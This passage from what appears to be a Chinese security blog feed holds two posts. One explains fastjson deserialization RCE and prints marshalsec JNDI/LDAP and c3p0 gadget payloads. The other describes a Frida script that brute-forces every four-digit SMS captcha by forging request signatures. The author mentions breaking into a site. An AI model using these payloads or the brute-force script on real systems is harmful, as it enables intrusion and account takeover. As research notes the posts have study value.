class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>JavaBeanInfo.build</code>里，会把目标类的方法和字段遍历一遍，分不同情况进行处理。类里面没有用<code>@JSONField</code>标记过的方法需要满足一些条件才能被加到列表里。</p><p>比如有些方法需要满足以下条件。</p><ul><li>方法名需要大于4</li><li>不能是静态方法</li><li>返回类型要么是<code>void</code>要么是当前类</li><li>参数只有一个</li><li>方法名需要以<code>set</code>开头。</li></ul><p>这些方法是典型的类成员变量的<code>setter</code>方法。通过这些方法的名字可以推测出对应的成员变量的名字。除了按照javaBean的规范来解析，fastjson还会推测一些其他的写法。</p><ul><li>第4个字母大写或者是Unicode的方法，取<code>set</code>后面的字符并剩下第一个字符转成小写当做变量名</li><li>第4个字母是<code>_</code>，取<code>_</code>后面的字符当做变量名</li><li>第4个字母是<code>f</code>，取<code>set</code>后面的字符当做变量名</li><li>第5个字母大写并且长度大于5，取<code>set</code>后面的字符并剩下第一个字符转成小写当做变量名</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/util/JavaBeanInfo.java:public static JavaBeanInfo build(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy)</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) <span class="keyword">continue</span>;</span><br><span class="line"> Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!methodName.startsWith(<span class="string">"set"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>同样的，对于<code>public static fields</code>和<code>getter</code>方法也会加入到列表里。</p><p>生成这些列表的时候也会判断成员变量是不是<code>public</code>的，会做一个标记说明是否能直接访问。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/util/FieldInfo.java</span></span><br><span class="line"><span class="keyword">if</span> (field != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> modifiers = field.getModifiers();</span><br><span class="line">    fieldAccess = ((modifiers &amp; Modifier.PUBLIC) != <span class="number">0</span> || method == <span class="keyword">null</span>);</span><br><span class="line">    fieldTransient = Modifier.isTransient(modifiers)</span><br><span class="line">            || TypeUtils.isTransient(method);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    fieldAccess = <span class="keyword">false</span>;</span><br><span class="line">    fieldTransient = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接下来就要进行<code>deserialze</code>操作了。<br>首先遍历前面生成的类的<code>fields</code>表，先对他们用对应的<code>Deserializers</code>处理一遍。猜测这步是为了给成员变量赋一个默认的值。<br>在遍历完成之后，再解析提交的json里的数据，调用<code>parseField</code>进行反序列化的处理。<code>parseField</code>处理了<code>Feature.SupportNonPublicField</code>的情况。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:protected &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features)</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> fieldIndex = <span class="number">0</span>;; fieldIndex++) &#123;</span><br><span class="line">     <span class="keyword">boolean</span> matchField = <span class="keyword">false</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fieldIndex &lt; sortedFieldDeserializers.length) &#123;</span><br><span class="line">        fieldDeser = sortedFieldDeserializers[fieldIndex];</span><br><span class="line">        fieldInfo = fieldDeser.fieldInfo;</span><br><span class="line">        fieldClass = fieldInfo.fieldClass;</span><br><span class="line">        feildAnnotation = fieldInfo.getAnnotation();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (fieldDeser != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (lexer.matchStat == JSONLexer.NOT_MATCH_NAME) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!matchField) &#123;</span><br><span class="line">        key = lexer.scanSymbol(parser.symbolTable);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (matchField) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">boolean</span> match = parseField(parser, key, object, type, fieldValues);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>在<code>parseField</code>中，选择合适的反序列化的方法，最终在<code>setValue</code>里调用类的<code>setter</code>方法。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//./src/main/java/com/alibaba/fastjson/parser/deserializer/FieldDeserializer.java:public void setValue(Object object, Object value)</span></span><br><span class="line"><span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    method.invoke(object, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="fastjson-的执行逻辑以及利用思路"><a href="#fastjson-的执行逻辑以及利用思路" class="headerlink" title="fastjson 的执行逻辑以及利用思路"></a>fastjson 的执行逻辑以及利用思路</h2><p>简单而言，fastjson 会从客户端接收一段json数据，并解析成为一个类的实例。<br>fastjson 有个叫做<code>@type</code>的特殊的key，可以指定当前json数据被反序列化为哪个类。这个类不能在内置的黑名单里。<br>类里不止有<code>public</code>类型的成员变量，还会有<code>private</code>的。<br>对<code>public</code>类型的成员变量，可以直接为它赋值。对<code>private</code>的，需要调用对应的<code>setter</code>方法才能访问到这些变量，除非启用<code>SupportNonPublicField</code>这个特性。</p><p>利用的思路为，找到java里一些可以访问到的类，查看里面的一些<code>setter</code>方法除了设置变量之外还做了什么其他的可能造成危险的操作，通过反序列化这个类并填充数据，最终调用危险的<code>setter</code>方法，完成利用。</p><p>对于<code>fastjson</code>来说，只要调用了<code>JSON.parse(text1);</code>或者<code>JSON.parseObject(text1, Object.class);</code>即有可能出现问题，而不一定需要设置<code>SupportNonPublicField</code>，这个看具体的利用思路。</p><p>当然，除了这种可能造成rce的利用方式，还可以在知道源码的情况下或者猜测成员变量设置一些原始请求中没有的属性。如注册用户时的<code>admin</code>属性等。</p><h2 id="fastjson-rce的利用"><a href="#fastjson-rce的利用" class="headerlink" title="fastjson rce的利用"></a>fastjson rce的利用</h2><p><code>Ricter</code>大佬直接丢过来一个讲java反序列化的<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">github地址</a>，说思路同jackson。<br>在这个github里有人整理了一些可以利用的java类并给出了对应的poc。有直接执行<code>bytecode</code>的，也有<code>JNDI</code>的。</p><p>下载编译好之后<br><code>java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.Jackson -a exploit.exec=&quot;calc&quot;</code><br>即可生成用于<code>jackson</code>的payload。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"org.springframework.beans.factory.config.PropertyPathFactoryBean"</span>,&#123;<span class="attr">"targetBeanName"</span>:<span class="string">"ldap://localhost:1389/obj"</span>,<span class="attr">"propertyPath"</span>:<span class="string">"foo"</span>,<span class="attr">"beanFactory"</span>:[<span class="string">"org.springframework.jndi.support.SimpleJndiBeanFactory"</span>,&#123;<span class="attr">"shareableResources"</span>:[<span class="string">"ldap://localhost:1389/obj"</span>]&#125;]&#125;]</span><br><span class="line"></span><br><span class="line">[<span class="string">"java.util.HashSet"</span>,[[<span class="string">"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"</span>,&#123;<span class="attr">"beanFactory"</span>:[<span class="string">"org.springframework.jndi.support.SimpleJndiBeanFactory"</span>,&#123;<span class="attr">"shareableResources"</span>:[<span class="string">"ldap://localhost:1389/obj"</span>]&#125;],<span class="attr">"adviceBeanName"</span>:<span class="string">"ldap://localhost:1389/obj"</span>&#125;],[<span class="string">"org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor"</span>,&#123;&#125;]]]</span><br><span class="line"></span><br><span class="line">[<span class="string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span>,&#123;<span class="attr">"userOverridesAsString"</span>:<span class="string">"HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a70707070707070707070787400074578706c6f6974740016687474703a2f2f6c6f63616c686f73743a383038302f740003466f6f;"</span>&#125;]</span><br><span class="line"></span><br><span class="line">[<span class="string">"com.mchange.v2.c3p0.JndiRefForwardingDataSource"</span>,&#123;<span class="attr">"jndiName"</span>:<span class="string">"ldap://localhost:1389/obj"</span>,<span class="attr">"loginTimeout"</span>:<span class="number">0</span>&#125;]</span><br></pre></td></tr></table></figure><p><code>Ricter</code>大佬在微博上发的利用<code>com.sun.rowset.JdbcRowSetImpl</code>这个类的方法可以在github里附带的一个pdf里找到。跟到这个类里去，发现在<code>setAutoCommit</code>的时候会调用<code>this.connect()</code>，在<code>connect()</code>里能加载远程的方法执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.sun.rowset.JdbcRowSetImpl</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.conn = <span class="keyword">this</span>.connect();</span><br><span class="line">        <span class="keyword">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>) ? var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span> ? DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()) : <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在利用的时候，开启rmi服务，发现会有请求过来，但是死活利用不成功。最后<code>Tomato</code>大佬给出问题的原因和解决方案，把服务器的hostname设置成外网ip就行了。</p><p>另外ph大佬在微博上提到 java 8u121 增加了trustURLCodebase选项，默认打不了了。<br>虽然有些利用方法可能在将来失效，但是一些漏洞产生原理还是值得学习的。</p><p>最后感谢雨神带我日站，感谢<code>Ricter</code>大佬在微博上发fastjson的exp指点我用<code>marshalsec</code>，感谢<code>Tomato</code>大佬指明rmi服务器无法连接成功的原因。</p><p>这几天发现大佬们又开始讨论<code>fastjson</code>的利用问题，那个站大概就是起因吧。:P</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up" target="_blank" rel="noopener">https://ricterz.me/posts/Fastjson%20Unserialize%20Vulnerability%20Write%20Up</a><br><a href="http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review.html" target="_blank" rel="noopener">http://rickgray.me/2016/08/19/jndi-injection-from-theory-to-apply-blackhat-review.html</a><br><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前几天和雨日一个站，发现有fastjson的问题，死活利用不成功。找大佬们帮忙要来exp弹shell成功了，事后学习下原理。&lt;br&gt;之前从来没搞过java，于是拉着雨对着&lt;code&gt;Ricter&lt;/code&gt;的博客一起跟了一遍流程，带我学习了一波。&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://5alt.me/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>记一次apk检测</title>
    <link href="http://5alt.me/2017/09/%E8%AE%B0%E4%B8%80%E6%AC%A1apk%E6%A3%80%E6%B5%8B/"/>
    <id>http://5alt.me/2017/09/记一次apk检测/</id>
    <published>2017-09-03T16:00:00.000Z</published>
    <updated>2019-08-16T04:24:28.788Z</updated>
    
    <content type="html"><![CDATA[<p>之前在日一个APP。去官网下apk回来，手机运行，发现走的https协议，请求带有一个签名参数，修改请求会导致签名不对无法通过验证。签名是40位的，看起来像是<code>sha1</code>。<br>上<a href="https://github.com/ac-pm/Inspeckage" target="_blank" rel="noopener">Inspeckage</a>，在log里也没发现与请求相关的hash函数。</p><p>拖到jeb里，发现加壳了。粗略看了下应该是梆梆的壳，渣渣如我根本不会脱壳。找大佬帮忙脱壳，却发现签名算法是放在native里的。。<br>硬着头皮把so拖到ida里，却发现整个so的结构非常奇怪，没有<code>JNI_OnLoad</code>，导出表里的函数对应位置也不对。应该还是壳的问题，把so也加固了。<br>adb shell到手机上，发现有好几个此apk的进程，从其中一个进程里的maps里找到加载这个so的地址，想直接dd出来，却发现一但dd进程就会退掉。。<br>尝试挂上ida远程调试，却发现无论如何也attach不上这个进程，猜测可能是被它的父进程ptrace了 = = 杀掉父进程这个子进程也就退出了。。<br>然后尝试直接hook脱壳后java里的一些方法，也不能hook到。想直接调用so，由于连<code>JNI_OnLoad</code>都没有，看起来也不像能直接调用的样子。<br>作为一个web狗碰到这些，在心里不知道念了多少次mdzz了。。<br><a id="more"></a><br>总而言之，加密算法在so里，java里有一个封装的调用入口。要么逆so，要么想办法hook到java里的方法。现在来看，两种都不能实现。</p><p>面对这种艰难的情况，接下来的思路其实还有两个。<br>要么搞iOS上ipa，ipa基本上是没有加壳的，只不过逆向起来非常恶心。找了台越狱的iPhone，砸壳后拖到hopper里，签名的函数倒是很好找，至于逆向算法，已经远远超出我的能力范围了。。用frida来hook，一些参数死活打不出来。。<br>要么找老版本apk，老版本可能还没有被加壳。搜啊搜，还真搜到了一个没加壳并且还能用的老版apk。没加壳的版本就可以愉快的hook了。</p><p>这个apk走https的流量无法被burpsuite抓到，应该是自带了证书。可以选择重打包apk替换掉里面的证书，或者强行把https的url改成http的。<br>我在搞的时候用了一个叫<a href="https://github.com/5alt/ssl_logger" target="_blank" rel="noopener">ssl_logger</a>的小脚本来辅助抓取https的请求和响应。</p><p>这是基于frida的一个hook脚本，需要手机上运行<code>frida-server</code>，并且需要电脑上frida版本与<code>frida-server</code>版本一致。</p><p>接下来就是继续用frida来hook签名函数，实现给自己的请求签名。</p><p>第一个测试目标是检测手机验证码是否能进行爆破。<br>编写脚本。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">body = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">data2body</span><span class="params">(data)</span>:</span></span><br><span class="line">    p = data.strip(<span class="string">'&#123;'</span>).strip(<span class="string">'&#125;'</span>).split(<span class="string">', '</span>)</span><br><span class="line">    body = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">        t = i.split(<span class="string">'='</span>, <span class="number">1</span>)</span><br><span class="line">        body += t[<span class="number">0</span>] + <span class="string">'='</span> + quote(t[<span class="number">1</span>]) + <span class="string">'&amp;'</span></span><br><span class="line">    <span class="keyword">return</span> body</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> body</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> message:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'captcha'</span> <span class="keyword">in</span> message[<span class="string">"payload"</span>]:</span><br><span class="line">                body = data2body(message[<span class="string">"payload"</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                body += <span class="string">'si=%s'</span>%message[<span class="string">"payload"</span>]</span><br><span class="line">                url = <span class="string">'https://5alt.me/checkcode'</span></span><br><span class="line">                headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded;charset=UTF-8'</span>&#125;</span><br><span class="line">                <span class="comment">#r = requests.post(url, body, headers=headers).text</span></span><br><span class="line">                <span class="keyword">print</span> body</span><br><span class="line">                <span class="keyword">print</span> r</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">'"errcode":769'</span> <span class="keyword">in</span> r:</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'-'</span>*<span class="number">20</span></span><br><span class="line">                    <span class="keyword">print</span> body</span><br><span class="line">                    <span class="keyword">print</span> r</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">'-'</span>*<span class="number">20</span></span><br><span class="line">            <span class="comment">#print("[*] Received data: &#123;0&#125;".format(message["payload"]))</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(message)</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_frida_script</span><span class="params">()</span>:</span></span><br><span class="line">    frida_script_code = <span class="string">"""</span></span><br><span class="line"><span class="string">function genAllNumber(start, end)&#123;</span></span><br><span class="line"><span class="string">    var output = [], n, padded;</span></span><br><span class="line"><span class="string">    for (n=start; n&lt;=end; n++) &#123;</span></span><br><span class="line"><span class="string">        padded = ('000'+n).slice(-4); // Prefix three zeros, and get the last 4 chars</span></span><br><span class="line"><span class="string">        output.push(padded);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    return output;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">    // Function to hook is defined here</span></span><br><span class="line"><span class="string">    var sig = Java.use('me.5alt.signature.a');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    sig.b.overload("java.util.Map", "java.lang.String", "boolean").implementation = function (a, b, c) &#123;</span></span><br><span class="line"><span class="string">        output = genAllNumber(0, 9999)</span></span><br><span class="line"><span class="string">        for(i in output)&#123;</span></span><br><span class="line"><span class="string">            a.put('captcha', output[i])</span></span><br><span class="line"><span class="string">            var timestamp = Date.parse(new Date());</span></span><br><span class="line"><span class="string">            timestamp = parseInt(timestamp / 1000);</span></span><br><span class="line"><span class="string">            a.put('tm', String(timestamp))</span></span><br><span class="line"><span class="string">            send(a.toString())</span></span><br><span class="line"><span class="string">            retval = this.b(a,b,c);</span></span><br><span class="line"><span class="string">            send(retval)</span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string">        return retval;</span></span><br><span class="line"><span class="string">    &#125;;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Executing following code:\n"</span> + frida_script_code</span><br><span class="line">    <span class="keyword">return</span> frida_script_code</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    session = frida.get_usb_device().attach(<span class="string">"me.5alt"</span>)</span><br><span class="line">    script = session.create_script(run_frida_script())</span><br><span class="line">    script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line">    sys.stdin.read()</span><br></pre></td></tr></table></figure><p>脚本非常简单粗暴，生成0000到9999的验证码，调用java的函数产生签名，然后发送出来交给python发请求探测。<br>服务器会检查timestamp，因此需要重新生成。手机上点一下提交即可触发。</p><p>这样用起来还不是很直观，总不能每发请求都得去手机上点一下。这时候想起来<a href="https://github.com/federicodotta/Brida/" target="_blank" rel="noopener">Brida</a>，可以把frida和burpsuite结合起来，在burpsuite里直接调用apk里的函数进行签名。</p><p><code>Brida</code>的用法就不啰嗦了，已经有详细的教程了。需要说明的是，必须得在Brida里开启server，并且spawn application，否则无法调用。本地修改完js之后记得reload一下，即刻生效。<br><code>Brida</code>里有个<code>Execute Method</code>，可以调用js里面定义的函数。这里执行和右键菜单中的<code>Brida Custom 1</code>的参数是不一样的。<code>Brida Custom 1</code>获取的参数是hex形式的，需要先解码才能用，同样，<code>Brida Custom 1</code>的返回需要先hex编码之后再return。</p><p>在写js的时候遇到了一些坑。。<br>js里的<code>unescape/decodeURIComponent/decodeURI</code>函数都不能把<code>+</code>解码成空格，我选择了手动替换的方式。<br>另外在js里调用java里的类相当于用反射的方式来操作，Map这个类我死活实例化不出来，于是只能找了个返回Map类型的方法调用一下来获得一个Map对象。</p><p>最后附上<a href="/downloads/apk.brida.js">Brida用的脚本</a>。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.frida.re/docs/android/" target="_blank" rel="noopener">https://www.frida.re/docs/android/</a><br><a href="http://bobao.360.cn/learning/detail/4209.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4209.html</a><br><a href="http://www.ninoishere.com/frida-learn-by-example/" target="_blank" rel="noopener">http://www.ninoishere.com/frida-learn-by-example/</a><br><a href="https://github.com/antojoseph/frida-android-hooks" target="_blank" rel="noopener">https://github.com/antojoseph/frida-android-hooks</a><br><a href="https://11x256.github.io/" target="_blank" rel="noopener">https://11x256.github.io/</a><br><a href="https://github.com/5alt/ssl_logger" target="_blank" rel="noopener">https://github.com/5alt/ssl_logger</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前在日一个APP。去官网下apk回来，手机运行，发现走的https协议，请求带有一个签名参数，修改请求会导致签名不对无法通过验证。签名是40位的，看起来像是&lt;code&gt;sha1&lt;/code&gt;。&lt;br&gt;上&lt;a href=&quot;https://github.com/ac-pm/Inspeckage&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Inspeckage&lt;/a&gt;，在log里也没发现与请求相关的hash函数。&lt;/p&gt;
